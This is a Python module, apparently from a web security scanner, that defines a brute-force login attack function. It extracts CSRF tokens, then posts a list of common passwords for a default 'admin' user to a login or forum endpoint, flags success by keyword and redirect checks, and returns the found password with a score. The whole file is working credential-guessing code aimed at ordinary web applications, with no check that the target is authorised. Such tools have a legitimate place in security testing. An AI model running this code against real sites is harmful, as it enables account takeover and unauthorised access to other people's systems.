import requests
import logging
import time
import re
from urllib.parse import urljoin, urlparse
from .utils import create_result

logger = logging.getLogger(__name__)

def brute_force_test(target_url, options=None):
    """
    Performs a brute force attack test against login forms or other password-protected endpoints.
    
    Args:
        target_url (str): The URL to attack
        options (dict): Options including:
            - username: Target username (default: "admin")
            - password_list: List of passwords to try
            - endpoint: Login endpoint (default: "/login")
            - type: Type of brute force ("login" or "forum")
            - username_field: Name of username field (default: "username")
            - password_field: Name of password field (default: "password")
            - max_attempts: Maximum attempts (default: all passwords)
            - delay: Delay between attempts in seconds (default: 0.5)
    
    Returns:
        dict: Results of the brute force attack
    """
    if options is None:
        options = {}
    
    logs = []
    logs.append(f"Starting brute force attack test on {target_url}")
    
    # Get options
    username = options.get('username', 'admin')
    password_list = options.get('password_list', ['password', 'admin123', '123456', 'qwerty'])
    endpoint = options.get('endpoint', '/login')
    attack_type = options.get('type', 'login')  # 'login' or 'forum'
    username_field = options.get('username_field', 'username')
    password_field = options.get('password_field', 'password')
    max_attempts = options.get('max_attempts', len(password_list))
    delay = options.get('delay', 0.5)
    
    # Construct full URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    if attack_type == 'login':
        url = urljoin(target_url, endpoint)
    else:  # forum
        url = target_url  # For forum posts, use the provided URL directly
    
    logs.append(f"Target URL: {url}")
    logs.append(f"Attack type: {attack_type}")
    logs.append(f"Username: {username}")
    logs.append(f"Max attempts: {max_attempts}")
    
    successful = False
    attempted = 0
    successful_password = None
    
    try:
        # First, make a GET request to check if the target is accessible
        session = requests.Session()
        response = session.get(url, timeout=10)
        
        if response.status_code != 200:
            logs.append(f"Target returned status code {response.status_code}, may not be accessible")
        
        # For login form, try to extract CSRF token if present
        csrf_token = None
        if attack_type == 'login' and response.text:
            # Basic pattern to find CSRF token - adjust as needed
            csrf_pattern = r'name=["\']csrf[_\-]token["\'] value=["\'](.*?)["\']'
            csrf_match = re.search(csrf_pattern, response.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)
                logs.append("CSRF token found in form")
        
        # Attempt brute force
        for password in password_list[:max_attempts]:
            attempted += 1
            logs.append(f"Attempt {attempted}: Testing password '{password}'")
            
            try:
                if attack_type == 'login':
                    # Login form attack
                    data = {
                        username_field: username,
                        password_field: password
                    }
                    
                    # Add CSRF token if found
                    if csrf_token:
                        data['csrf_token'] = csrf_token
                    
                    response = session.post(url, data=data, timeout=10)
                    
                    # Check for successful login indicators
                    success_indicators = [
                        "login successful", 
                        "welcome", 
                        "dashboard",
                        "logged in",
                        "account",
                        "profile"
                    ]
                    
                    failure_indicators = [
                        "incorrect password",
                        "login failed",
                        "invalid credentials",
                        "try again"
                    ]
                    
                    response_text = response.text.lower()
                    
                    if any(indicator in response_text for indicator in success_indicators):
                        successful = True
                        successful_password = password
                        logs.append(f"Success! Password found: {password}")
                        break
                    
                    # Check the URL after login attempt - redirects often indicate success
                    if response.url != url:
                        # If we were redirected to a new page that doesn't have login failure indicators
                        if not any(indicator in response_text for indicator in failure_indicators):
                            successful = True
                            successful_password = password
                            logs.append(f"Possible success based on redirect to {response.url}")
                            break
                
                else:  # forum post attack
                    # For forum posting, simulate posting with different credentials
                    data = {
                        username_field: username,
                        password_field: password,
                        'content': 'Test post from automated system'
                    }
                    
                    response = session.post(url, data=data, timeout=10)
                    
                    # Check for successful post indicators
                    if response.status_code == 200 and "post successful" in response.text.lower():
                        successful = True
                        successful_password = password
                        logs.append(f"Success! Forum post accepted with password: {password}")
                        break
            
            except Exception as request_error:
                logs.append(f"Error on attempt {attempted}: {str(request_error)}")
            
            # Add delay between attempts
            if delay > 0 and attempted < max_attempts:
                time.sleep(delay)
        
        if successful:
            return {
                "logs": logs,
                "score": 10,
                "success": True,
                "details": {
                    "username": username,
                    "password": successful_password,
                    "attempts": attempted,
                    "type": attack_type
                }
            }
        else:
            logs.append("Brute force attack failed. No valid credentials found.")
            return {
                "logs": logs,
                "score": 5,
                "success": False,
                "details": {
                    "attempts": attempted,
                    "type": attack_type
                }
            }
            
    except Exception as e:
        logs.append(f"Error during brute force attack: {str(e)}")
        return {
            "logs": logs,
            "score": 0,
            "success": False,
            "error": str(e),
            "details": {
                "attempts": attempted,
                "type": attack_type
            }
        }
